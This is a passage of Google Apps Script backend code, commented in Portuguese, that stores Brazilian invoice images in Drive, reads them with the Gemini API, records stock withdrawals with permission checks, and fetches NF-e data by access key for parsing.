  if (!(pagina > 1)) pagina = 1;
  var sufixo = pagina > 1 ? '_p' + pagina : '';
  var nome = 'NF-' + (p.numero || p.id || Date.now()) + '_' + (p.id || '') + sufixo + '.jpg';
  var blob = Utilities.newBlob(Utilities.base64Decode(b64.split(',')[1]), 'image/jpeg', nome);
  var pasta = nfPastaDaNota(p.obra, p.competencia);

  // se a mesma nota ja tem arquivo, substitui em vez de acumular copias
  var antigos = pasta.getFilesByName(nome);
  while (antigos.hasNext()) { try { antigos.next().setTrashed(true); } catch (e) {} }

  var f = pasta.createFile(blob);
  f.setSharing(DriveApp.Access.PRIVATE, DriveApp.Permission.NONE);
  var fileId = f.getId();

  // grava o arquivo na linha da nota, se ela ja existir (só a página 1:
  // as outras vão para a coluna `paginas`, montada pelo app)
  try {
    if (pagina > 1) throw 0;                    // pula a gravação na planilha
    var a = getOrCreate(ABA_NF);
    var dados = a.getDataRange().getValues();
    var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
    var iId = idxCol(cab, 'id'), iCli = idxCol(cab, 'clientid');
    var iDid = idxCol(cab, 'driveid'), iDlk = idxCol(cab, 'drivelink');
    for (var i = 1; i < dados.length; i++) {
      var bate = (iId !== -1 && String(dados[i][iId]).trim() === String(p.id || '').trim()) ||
                 (iCli !== -1 && String(dados[i][iCli]).trim() === String(p.id || '').trim());
      if (bate) {
        if (iDid !== -1) a.getRange(i + 1, iDid + 1).setValue(fileId);
        if (iDlk !== -1) a.getRange(i + 1, iDlk + 1).setValue(f.getUrl());
        break;
      }
    }
  } catch (e) {}

  return { ok: true, fileId: fileId, link: f.getUrl(), pasta: pasta.getName(), pagina: pagina };
}

// ------------------------------------------------------------
// LEITURA DA IMAGEM DA NOTA (OCR + interpretação) via Gemini
//
// Escolhido por ser o que encaixa nesta arquitetura sem obra nova:
// o backend ja e Google (Apps Script/Sheets/Drive) e basta uma
// chave de API nas Propriedades do script — sem conta de servico,
// sem projeto no GCP, sem biblioteca externa.
//
// Propriedades do script:
//   GEMINI_API_KEY = <chave da API>            (obrigatoria)
//   GEMINI_MODEL   = gemini-2.5-flash          (opcional)
//
// Sem a chave, o app continua funcionando: cai na chave de acesso
// lida do codigo de barras e na digitacao.
// ------------------------------------------------------------
function nfLerIA(p) {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty('GEMINI_API_KEY');
  if (!key) return { ok: false, motivo: 'sem_ia' };

  var b64 = String(p.foto || '');
  var texto = String(p.texto || '');
  // O PDF da DANFE quase sempre traz o texto embutido. Quando o app consegue
  // extrair esse texto, ele manda o texto em vez da imagem: nao ha OCR no meio,
  // entao nao ha erro de leitura de caractere — e sai bem mais barato.
  if (!texto && b64.indexOf('data:image') !== 0) return { ok: false, motivo: 'imagem_invalida' };
  var modelo = props.getProperty('GEMINI_MODEL') || 'gemini-2.5-flash';

  var prompt =
    (texto
      ? 'Abaixo está o TEXTO extraído do PDF de uma DANFE (Documento Auxiliar da Nota Fiscal Eletrônica) brasileira, '
      : 'Você está lendo a IMAGEM de uma DANFE (Documento Auxiliar da Nota Fiscal Eletrônica) brasileira, ') +
    'recebida por uma construtora de obras públicas.\n' +
    'Extraia os campos abaixo e responda SOMENTE com um objeto JSON, sem texto em volta e sem cercas de código.\n\n' +
    'Formato exigido:\n' +
    '{\n' +
    '  "dados": {\n' +
    '    "numero": "", "serie": "", "chave": "", "dataEmissao": "AAAA-MM-DD", "dataEntrada": "AAAA-MM-DD",\n' +
    '    "cnpj": "", "razaoSocial": "", "nomeFantasia": "", "municipio": "", "uf": "",\n' +
    '    "vProd": 0, "vFrete": 0, "vTotal": 0, "vBaseICMS": 0, "vICMS": 0,\n' +
    '    "itens": [{"codigo":"","descricao":"","qtd":0,"un":"","vUnit":0,"vTotal":0}]\n' +
    '  },\n' +
    '  "confianca": { "numero":0.0, "serie":0.0, "chave":0.0, "dataEmissao":0.0, "cnpj":0.0, "razaoSocial":0.0, "vTotal":0.0, "itens":0.0 },\n' +
    '  "confiancaGeral": 0.0\n' +
    '}\n\n' +
    'Regras:\n' +
    '- Emitente é quem VENDEU (o fornecedor), não o destinatário. Use o CNPJ e a razão social do emitente.\n' +
    '- Valores numéricos em ponto decimal, sem "R$" e sem separador de milhar. 1.234,56 vira 1234.56.\n' +
    '- Datas sempre em AAAA-MM-DD. Se só houver dia/mês/ano na imagem, converta.\n' +
    '- Campo que você não conseguir ler: string vazia "" ou número 0, e confiança 0.\n' +
    '- NUNCA invente número, valor ou CNPJ. Prefira deixar vazio a chutar.\n' +
    '- Confiança de 0 a 1 por campo, refletindo o quanto o texto estava legível.\n' +
    '\nOnde procurar na DANFE:\n' +
    '- "NF-e Nº" e "SÉRIE" ficam no quadro superior, ao lado do código de barras.\n' +
    '- O emitente é o bloco do topo à esquerda, junto do logotipo; o DESTINATÁRIO/REMETENTE é outro bloco, mais abaixo — não confunda.\n' +
    '- "CÁLCULO DO IMPOSTO" traz BASE DE CÁLCULO DO ICMS, VALOR DO ICMS, VALOR DO FRETE, VALOR TOTAL DOS PRODUTOS e VALOR TOTAL DA NOTA.\n' +
    '- "DADOS DO PRODUTO / SERVIÇO" é a tabela dos itens: CÓDIGO, DESCRIÇÃO, UNID, QUANT, VALOR UNITÁRIO e VALOR TOTAL. Traga uma linha por item, na ordem em que aparecem.\n' +
    '- Ignore o quadro "DADOS ADICIONAIS" e os textos de informações complementares.\n' +
    (p.chave ? '- A chave de acesso já foi lida do código de barras e é: ' + String(p.chave).replace(/\D/g, '') + '. Use-a e mantenha coerência com número, série e CNPJ dela.\n' : '');

  var partes = [{ text: prompt }];
  if (texto) {
    partes.push({ text: '\n--- TEXTO EXTRAIDO DO PDF DA NOTA ---\n' + texto.slice(0, 24000) });
  } else {
    partes.push({ inline_data: { mime_type: 'image/jpeg', data: b64.split(',')[1] } });
  }

  var payload = {
    contents: [{ role: 'user', parts: partes }],
    // O 2.5 "pensa" antes de responder e esse raciocínio consome o mesmo teto de
    // tokens da resposta. Numa DANFE cheia isso estourava o limite e voltava vazio.
    // Aqui a tarefa é copiar campo de imagem, não raciocinar: desliga o pensamento
    // e sobra teto para o JSON inteiro.
    generationConfig: {
      temperature: 0, maxOutputTokens: 8192, responseMimeType: 'application/json',
      thinkingConfig: { thinkingBudget: 0 }
    }
  };

  var resp = nfChamarGemini(modelo, key, payload);
  if (!resp.ok) return resp;

  var j = resp.json;
  var cand = (j.candidates && j.candidates[0]) || null;
  var motivoFim = cand ? String(cand.finishReason || '') : '';

  // resposta bloqueada ou cortada: dizer o que houve, não um "não consegui" seco
  if (!cand && j.promptFeedback && j.promptFeedback.blockReason) {
    return { ok: false, motivo: 'bloqueado', detalhe: String(j.promptFeedback.blockReason) };
  }
  if (motivoFim === 'MAX_TOKENS') {
    return { ok: false, motivo: 'longa', detalhe: 'A nota tem itens demais para uma leitura só.' };
  }
  if (motivoFim === 'SAFETY' || motivoFim === 'PROHIBITED_CONTENT') {
    return { ok: false, motivo: 'bloqueado', detalhe: motivoFim };
  }

  var partes = cand && cand.content && cand.content.parts;
  var txt = (partes || []).map(function (x) { return x.text || ''; }).join('');
  txt = String(txt).replace(/^\s*```(?:json)?/i, '').replace(/```\s*$/, '').trim();
  if (!txt) return { ok: false, motivo: 'vazia', detalhe: motivoFim || 'o modelo não devolveu texto' };

  var out;
  try { out = JSON.parse(txt); } catch (e) {
    var mm = txt.match(/\{[\s\S]*\}/);
    if (!mm) return { ok: false, motivo: 'resposta', detalhe: txt.slice(0, 160) };
    try { out = JSON.parse(mm[0]); } catch (e2) { return { ok: false, motivo: 'resposta', detalhe: txt.slice(0, 160) }; }
  }
  if (!out || !out.dados) return { ok: false, motivo: 'resposta', detalhe: 'veio JSON sem o campo "dados"' };

  registrarAuditoria(usuarioDoToken(p.token), 'app', 'nfLeituraIA', p.obra || '', String(out.dados.numero || ''), modelo,
    'confiança ' + (out.confiancaGeral == null ? '?' : out.confiancaGeral));

  return {
    ok: true, modelo: modelo,
    dados: out.dados,
    confianca: out.confianca || {},
    confiancaGeral: typeof out.confiancaGeral === 'number' ? out.confiancaGeral : 0.6
  };
}

// -------------------- SAIDA DE ESTOQUE (CONSUMO) --------------------
// A entrada do estoque e derivada da nota e pode ser recalculada. A saida nao:
// e um registro proprio, por isso tem linha na planilha, upsert pelo id e a
// mesma regra de exclusao do resto do app.
function saidaSalvar(p) {
  var a = getOrCreate(ABA_SAIDA);
  var cab = cabecalho(a);
  var dados = a.getDataRange().getValues();
  var iId = idxCol(cab, 'id');
  var reg = {
    id: p.id || gerarId(new Date(), 'sa'),
    obra: p.obra || '',
    materialid: p.materialId || '',
    descricao: p.descricao || '',
    un: p.un || 'UN',
    qtd: Number(p.qtd) || 0,
    data: normData(p.data),
    capid: p.capid == null ? '' : p.capid,
    rua: p.rua || '',
    responsavel: p.responsavel || '',
    obs: p.obs || '',
    /* O DONO vem do TOKEN, nunca do que o cliente declarou. Este campo é o
       que a regra "só admin ou quem lançou apaga" consulta e o que vai para a
       Auditoria: aceitar `p.usuario` era deixar qualquer um assinar em nome de
       outro — e apagar o registro alheio. Só cai no que veio do cliente quando
       não há sessão (EXIGIR_TOKEN desligado), que é o modo de implantação. */
    usuario: usuarioDoToken(p.token) || p.usuario || '',
    criadoem: p.criadoem || Date.now()
  };
  var linha = cab.map(function (nc) { return reg.hasOwnProperty(nc) ? reg[nc] : ''; });
  var achou = -1;
  if (iId !== -1) {
    for (var i = 1; i < dados.length; i++) {
      if (String(dados[i][iId]).trim() === String(reg.id).trim()) { achou = i; break; }
    }
  }
  if (achou > -1) a.getRange(achou + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
  else a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
  registrarAuditoria(reg.usuario, perfilDoToken(p.token), achou > -1 ? 'saidaAlterar' : 'saidaRegistrar',
    reg.obra, reg.id, '', reg.descricao + ' - ' + reg.qtd + ' ' + reg.un);
  return { ok: true, id: reg.id };
}

function saidaExcluir(obra, id, token) {
  var a = getOrCreate(ABA_SAIDA);
  var dados = a.getDataRange().getValues();
  if (dados.length < 2) return { ok: true, removido: false };
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iId = idxCol(cab, 'id'), iUsu = idxCol(cab, 'usuario');
  for (var i = dados.length - 1; i >= 1; i--) {
    if (iId !== -1 && String(dados[i][iId]).trim() === String(id).trim()) {
      if (!podeApagarLinha(token, iUsu !== -1 ? dados[i][iUsu] : '')) {
        registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'EXCLUSAO_NEGADA', obra, id, '', 'saida de estoque');
        return { ok: false, error: 'SEM_PERMISSAO', mensagem: 'So quem registrou a saida ou o administrador pode apagar.' };
      }
      a.deleteRow(i + 1);
      registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'saidaExcluir', obra, id, '', '');
      return { ok: true, removido: true };
    }
  }
  return { ok: true, removido: false };
}

// Chamada ao Gemini isolada: trata a falta de autorizacao do Apps Script para
// acessar a internet, e refaz o pedido sem "thinkingConfig" caso o modelo
// escolhido nao aceite esse ajuste (modelos anteriores ao 2.5).
function nfChamarGemini(modelo, key, payload) {
  var url = 'https://generativelanguage.googleapis.com/v1beta/models/' +
            encodeURIComponent(modelo) + ':generateContent?key=' + encodeURIComponent(key);
  var opts = { method: 'post', contentType: 'application/json', muteHttpExceptions: true };

  function tentar(corpo) {
    opts.payload = JSON.stringify(corpo);
    try {
      return { res: UrlFetchApp.fetch(url, opts) };
    } catch (e) {
      var msg = String(e && e.message ? e.message : e);
      // scope novo (script.external_request): a implantacao antiga nao tem
      if (/permission|autoriza|authoriz|scope/i.test(msg)) {
        return { erro: { ok: false, motivo: 'autorizacao', detalhe: msg.slice(0, 200) } };
      }
      return { erro: { ok: false, motivo: 'rede', detalhe: msg.slice(0, 200) } };
    }
  }

  var t = tentar(payload);
  if (t.erro) return t.erro;
  var res = t.res;

  if (res.getResponseCode() === 400 && payload.generationConfig && payload.generationConfig.thinkingConfig) {
    var copia = JSON.parse(JSON.stringify(payload));
    delete copia.generationConfig.thinkingConfig;
    var t2 = tentar(copia);
    if (t2.erro) return t2.erro;
    res = t2.res;
  }

  var codigo = res.getResponseCode();
  var corpo = String(res.getContentText());
  if (codigo !== 200) {
    var detalhe = corpo.slice(0, 300);
    try {
      var e = JSON.parse(corpo);
      if (e && e.error && e.error.message) detalhe = e.error.message;
    } catch (ex) {}
    var motivo = 'api';
    if (codigo === 400 && /API key not valid|API_KEY_INVALID/i.test(detalhe)) motivo = 'chave_invalida';
    else if (codigo === 403) motivo = 'chave_sem_acesso';
    else if (codigo === 404) motivo = 'modelo';
    else if (codigo === 429) motivo = 'limite';
    return { ok: false, motivo: motivo, codigo: codigo, detalhe: detalhe };
  }

  try {
    return { ok: true, json: JSON.parse(corpo) };
  } catch (e2) {
    return { ok: false, motivo: 'resposta', detalhe: corpo.slice(0, 200) };
  }
}

// Diagnostico da leitura automatica: diz em bom portugues o que esta faltando.
// Nunca devolve a chave da API, so se ela existe e se a chamada funciona.
// Rode ESTA função uma vez pelo editor do Apps Script para o Google pedir a
// permissão de acesso à internet. Ela não faz mais nada — existe só para
// disparar a autorização. O nfDiag não serve para isso: se a chave não estiver
// cadastrada ele volta antes de tocar na internet e o Google não pergunta nada.
function autorizarInternet() {
  var r = UrlFetchApp.fetch('https://generativelanguage.googleapis.com/v1beta/models', { muteHttpExceptions: true });
  Logger.log('Autorização de internet OK. O servidor respondeu com o código ' + r.getResponseCode() +
             ' (401/403 aqui é normal: a chamada foi feita sem chave, o que importa é ter saído).');
  return true;
}

function nfDiag() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty('GEMINI_API_KEY');
  var modelo = props.getProperty('GEMINI_MODEL') || 'gemini-2.5-flash';
  var out = {
    ok: true,
    versaoBackend: 'notas-fiscais-2',
    chaveConfigurada: !!key,
    tamanhoChave: key ? String(key).length : 0,
    modelo: modelo,
    propriedades: props.getKeys().sort().join(', '),
    consultaChaveConfigurada: !!nfeApiConfig().url
  };
  // o próprio Apps Script sabe dizer se ainda falta autorização — e devolve o
  // endereço para autorizar, que é melhor do que explicar o caminho do menu
  try {
    var info = ScriptApp.getAuthorizationInfo(ScriptApp.AuthMode.FULL);
    out.precisaAutorizar = (info.getAuthorizationStatus() === ScriptApp.AuthorizationStatus.REQUIRED);
    if (out.precisaAutorizar) out.autorizacaoUrl = info.getAuthorizationUrl();
  } catch (e) { out.precisaAutorizar = null; }

  if (!key) {
    out.leituraOk = false;
    out.motivo = 'sem_ia';
    out.mensagem = 'A propriedade GEMINI_API_KEY não está no script' +
      (out.propriedades ? ' (as que estão lá: ' + out.propriedades + ')' : ' (não há nenhuma propriedade cadastrada)') +
      '. Confira se salvou na mesma planilha e se o nome está exatamente GEMINI_API_KEY.';
    return out;
  }
  var r = nfChamarGemini(modelo, key, {
    contents: [{ role: 'user', parts: [{ text: 'Responda apenas: OK' }] }],
    generationConfig: { temperature: 0, maxOutputTokens: 16, thinkingConfig: { thinkingBudget: 0 } }
  });
  out.leituraOk = !!r.ok;
  if (r.ok) {
    out.mensagem = 'Leitura automática funcionando. O modelo ' + modelo + ' respondeu normalmente.';
  } else {
    out.motivo = r.motivo;
    out.detalhe = r.detalhe || '';
    out.mensagem = ({
      autorizacao: 'O Apps Script ainda não tem permissão para acessar a internet. Abra o editor do script, rode qualquer função pelo botão "Executar" e aceite a autorização que aparecer. Depois republique.',
      chave_invalida: 'A GEMINI_API_KEY foi recusada. Confira se copiou a chave inteira, sem espaço no começo ou no fim.',
      chave_sem_acesso: 'A chave existe mas não tem acesso à API. Gere uma nova em aistudio.google.com/apikey.',
      modelo: 'O modelo "' + modelo + '" não existe para esta chave. Apague a propriedade GEMINI_MODEL para usar o padrão.',
      limite: 'A cota da chave estourou. Tente de novo daqui a pouco.',
      rede: 'Não consegui falar com o servidor da IA.'
    })[r.motivo] || ('A chamada à IA falhou: ' + (r.detalhe || r.motivo));
  }
  return out;
}

// ============================================================
// CONSULTA DA NOTA PELA CHAVE DE ACESSO
// ------------------------------------------------------------
// Servicos como consultadanfe.com, meudanfe.com.br e nfe.io tem o
// certificado digital e devolvem a nota a partir da chave. Isso e melhor
// do que qualquer OCR: os dados vem do XML oficial, exatamente como o
// fornecedor emitiu.
//
// O endereco e o token ficam nas Propriedades do script, porque cada
// servico tem o seu contrato:
//   NFE_API_URL     = https://.../consulta?chave={chave}   ({chave} e trocado)
//   NFE_API_TOKEN   = seu token             (opcional)
//   NFE_API_HEADER  = Authorization         (opcional, padrao Authorization)
//   NFE_API_PREFIXO = "Bearer "             (opcional, padrao "Bearer ")
//   NFE_API_METODO  = GET | POST            (opcional, padrao GET)
//   NFE_API_CAMPO   = chave                 (opcional, nome do campo no POST)
//
// A resposta pode vir como XML da NF-e ou como JSON. O XML e o caminho
// bom: o layout e padronizado pela Receita, entao a leitura e exata.
// ============================================================
// Vem ligado no consultadanfe.com, que e gratuito e nao pede cadastro:
//   POST /api/v1/consulta  com  {"chave": "..."}
// Para usar outro servico, basta trocar as propriedades. Para desligar a
// consulta, ponha NFE_API_URL = off.
var NFE_API_PADRAO = 'https://consultadanfe.com/api/v1/consulta';

function nfeApiConfig() {
  var p = PropertiesService.getScriptProperties();
  var url = p.getProperty('NFE_API_URL');
  if (url == null || url === '') url = NFE_API_PADRAO;
  if (String(url).toLowerCase() === 'off' || String(url).toLowerCase() === 'nao') url = '';
  return {
    url: url,
    padrao: url === NFE_API_PADRAO,
    token: p.getProperty('NFE_API_TOKEN') || '',
    header: p.getProperty('NFE_API_HEADER') || 'Authorization',
    prefixo: p.getProperty('NFE_API_PREFIXO') == null ? 'Bearer ' : p.getProperty('NFE_API_PREFIXO'),
    metodo: (p.getProperty('NFE_API_METODO') || (url === NFE_API_PADRAO ? 'POST' : 'GET')).toUpperCase(),
    campo: p.getProperty('NFE_API_CAMPO') || 'chave'
  };
}

function nfConsultarChave(p) {
  var chave = String(p.chave || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
  if (chave.length !== 44) return { ok: false, motivo: 'chave_invalida' };

  var cfg = nfeApiConfig();
  if (!cfg.url) return { ok: false, motivo: 'sem_api' };

  var url = cfg.url.indexOf('{chave}') !== -1
    ? cfg.url.replace('{chave}', encodeURIComponent(chave))
    : cfg.url;
  var opts = { muteHttpExceptions: true, headers: {} };
  if (cfg.token) opts.headers[cfg.header] = cfg.prefixo + cfg.token;
  if (cfg.metodo === 'POST') {
    opts.method = 'post';
    opts.contentType = 'application/json';
    var corpo = {};
    corpo[cfg.campo] = chave;
    opts.payload = JSON.stringify(corpo);
  } else {
    opts.method = 'get';
    if (cfg.url.indexOf('{chave}') === -1) {
      url += (url.indexOf('?') === -1 ? '?' : '&') + encodeURIComponent(cfg.campo) + '=' + encodeURIComponent(chave);
    }
  }

  var res;
  try {
    res = UrlFetchApp.fetch(url, opts);
  } catch (e) {
    var msg = String(e && e.message ? e.message : e);
    if (/permission|autoriza|authoriz|scope/i.test(msg)) return { ok: false, motivo: 'autorizacao', detalhe: msg.slice(0, 200) };
    return { ok: false, motivo: 'rede', detalhe: msg.slice(0, 200) };
  }
  var codigo = res.getResponseCode();
  var corpoTxt = String(res.getContentText());
  if (codigo !== 200) {
    // erros do consultadanfe (e da maioria dos servicos) em bom portugues
    var motivoCod = ({
      202: 'pendente',      // NF-e em contingencia, ainda nao disponivel
      400: 'chave_recusada',
      401: 'token', 403: 'token',
      404: 'nao_encontrada', // nao autorizada na SEFAZ ou fora da janela de datas
      429: 'limite',
      503: 'sefaz'
    })[codigo] || 'api';
    var detErro = corpoTxt.slice(0, 300);
    try {
      var je = JSON.parse(corpoTxt);
      if (je && (je.message || je.erro || je.error)) detErro = je.message || je.erro || je.error;
    } catch (ex) {}
    var cabErro = '';
    try { cabErro = res.getHeaders()['X-Error-Code'] || res.getAllHeaders()['X-Error-Code'] || ''; } catch (ex2) {}
    return { ok: false, motivo: motivoCod, codigo: codigo, erroCod: cabErro, detalhe: detErro };
  }

  var pdf = nfeAcharPDF(corpoTxt);
  var xml = nfeAcharXML(corpoTxt);
  if (!xml) return { ok: false, motivo: 'sem_xml', detalhe: corpoTxt.slice(0, 300), pdf: pdf };

  var dados;
  try {
    dados = nfeDoXML(xml);
  } catch (e2) {
    return { ok: false, motivo: 'xml_invalido', detalhe: String(e2 && e2.message ? e2.message : e2).slice(0, 200) };
  }
  if (!dados) return { ok: false, motivo: 'xml_invalido' };

  registrarAuditoria(usuarioDoToken(p.token), 'app', 'nfConsultaChave', p.obra || '', dados.numero || '', chave, 'NF-e obtida pela chave');
  // o PDF oficial vem junto: vale mais como arquivo da nota do que a foto
  return { ok: true, fonte: 'xml', dados: dados, confiancaGeral: 1, pdf: pdf };
}

// alguns servicos devolvem o PDF do DANFE junto, em base64
function nfeAcharPDF(txt) {
  try {
    var j = JSON.parse(String(txt));
    var v = j.pdf_base64 || j.pdfBase64 || j.pdf || '';
    v = String(v || '');
    // 3 MB de base64 ja e um DANFE enorme; acima disso nao vale trafegar
    return (v.length > 100 && v.length < 3000000) ? v : '';
  } catch (e) { return ''; }
}

// A resposta pode ser o XML puro, ou um JSON com o XML dentro de algum campo.
function nfeDeBase64(v) {
  try {
    var bytes = Utilities.base64Decode(String(v));
    return Utilities.newBlob(bytes).getDataAsString('UTF-8');
  } catch (e) { return ''; }
}

function nfeAcharXML(txt) {
  var t = String(txt || '');
  if (t.indexOf('<infNFe') !== -1) return t;
  var j = null;
  try { j = JSON.parse(t); } catch (e) { return ''; }
  var achado = '';
  function varrer(v, prof) {
    if (achado || prof > 6 || v == null) return;
    if (typeof v === 'string') {
      if (v.indexOf('<infNFe') !== -1) { achado = v; return; }
      // o consultadanfe manda o XML autorizado em base64 (xml_base64)
      if (v.length > 200 && /^[A-Za-z0-9+/=\s]+$/.test(v)) {
        var d = nfeDeBase64(v);
        if (d && d.indexOf('<infNFe') !== -1) achado = d;
      }
      return;
    }
    if (typeof v === 'object') {
      var ks = Object.keys(v);
      for (var i = 0; i < ks.length && !achado; i++) varrer(v[ks[i]], prof + 1);
    }
  }
  varrer(j, 0);
  return achado;
}

// ---- leitura do XML da NF-e (layout da Receita, sem depender do namespace) ----
function nfeFilho(el, nome) {
  if (!el) return null;
  var fs = el.getChildren();
  var n = String(nome).toLowerCase();
  for (var i = 0; i < fs.length; i++) if (fs[i].getName().toLowerCase() === n) return fs[i];
  return null;
}
function nfeFilhos(el, nome) {
  var out = [];
  if (!el) return out;
  var fs = el.getChildren();
  var n = String(nome).toLowerCase();
  for (var i = 0; i < fs.length; i++) if (fs[i].getName().toLowerCase() === n) out.push(fs[i]);
  return out;
}
function nfeTxt(el, nome) {
  var f = nfeFilho(el, nome);
  return f ? String(f.getText()).trim() : '';
}
function nfeNum(el, nome) {
  var v = nfeTxt(el, nome);
  if (!v) return 0;
  var s = String(v).trim().replace(/R\$\s*/gi, '').replace(/\s+/g, '');
  if (s.indexOf(',') > -1 && s.indexOf('.') > -1) {
    if (s.lastIndexOf(',') > s.lastIndexOf('.')) s = s.replace(/\./g, '').replace(',', '.');
    else s = s.replace(/,/g, '');
  } else if (s.indexOf(',') > -1) {
    s = s.replace(',', '.');
  }
  var n = parseFloat(s);
  return isNaN(n) ? 0 : n;
}
// procura infNFe em qualquer profundidade (nfeProc > NFe > infNFe, ou direto)
function nfeAcharInf(el, prof) {
  if (!el || prof > 6) return null;
  if (el.getName() === 'infNFe') return el;
  var fs = el.getChildren();
  for (var i = 0; i < fs.length; i++) {
    var r = nfeAcharInf(fs[i], prof + 1);
    if (r) return r;
  }
  return null;
}

function nfeDoXML(xml) {
  var doc = XmlService.parse(String(xml).replace(/^﻿/, '').trim());
  var inf = nfeAcharInf(doc.getRootElement(), 0);
  if (!inf) return null;

  var ide = nfeFilho(inf, 'ide');
  var emit = nfeFilho(inf, 'emit');
  var ender = emit ? nfeFilho(emit, 'enderEmit') : null;
  var total = nfeFilho(inf, 'total');
  var icmsTot = total ? nfeFilho(total, 'ICMSTot') : null;

  var chave = '';
  try { chave = String(inf.getAttribute('Id').getValue()).replace(/^NFe/i, ''); } catch (e) {}

  var emissao = nfeTxt(ide, 'dhEmi') || nfeTxt(ide, 'dEmi');
  var entrada = nfeTxt(ide, 'dhSaiEnt') || nfeTxt(ide, 'dSaiEnt');

  var itens = [];
  var dets = nfeFilhos(inf, 'det');
  for (var i = 0; i < dets.length && i < 200; i++) {
    var prod = nfeFilho(dets[i], 'prod');
    if (!prod) continue;
    itens.push({
      codigo: nfeTxt(prod, 'cProd'),
      descricao: nfeTxt(prod, 'xProd'),
      qtd: nfeNum(prod, 'qCom'),
      un: nfeTxt(prod, 'uCom'),
      vUnit: nfeNum(prod, 'vUnCom'),
      vTotal: nfeNum(prod, 'vProd')
    });
  }

  return {
    chave: chave,
    numero: nfeTxt(ide, 'nNF'),
    serie: nfeTxt(ide, 'serie'),
    dataEmissao: String(emissao).slice(0, 10),
    dataEntrada: String(entrada).slice(0, 10),
    cnpj: nfeTxt(emit, 'CNPJ') || nfeTxt(emit, 'CPF'),
    razaoSocial: nfeTxt(emit, 'xNome'),
    nomeFantasia: nfeTxt(emit, 'xFant'),
    municipio: nfeTxt(ender, 'xMun'),
    uf: nfeTxt(ender, 'UF'),
    vProd: nfeNum(icmsTot, 'vProd'),
    vFrete: nfeNum(icmsTot, 'vFrete'),
    vTotal: nfeNum(icmsTot, 'vNF'),
    vBaseICMS: nfeNum(icmsTot, 'vBC'),
    vICMS: nfeNum(icmsTot, 'vICMS'),
    itens: itens
  };
}
